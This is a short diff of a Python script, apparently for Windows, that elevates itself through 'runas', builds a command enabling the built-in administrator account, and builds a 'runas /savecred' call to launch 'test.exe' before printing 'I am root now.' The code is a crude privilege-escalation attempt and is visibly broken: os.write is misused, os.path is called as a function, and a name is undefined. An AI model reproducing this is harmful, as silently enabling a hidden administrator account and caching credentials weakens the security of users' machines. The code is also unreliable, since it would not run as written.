@@ -13,7 +13,7 @@ if not checkAdminStatus():
     try:
         ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
         string1 = "net user administrator /active:yes"
-        string2 = "runas /user:" + os.getenv('username') + "\Administrator /savecred" + os.path(test.py)
+        string2 = "runas /user:" + os.getenv('username') + "\Administrator /savecred" + os.path('test.exe')
         os.write(string1)
         os.write(string2)
         print ("I am root now.")
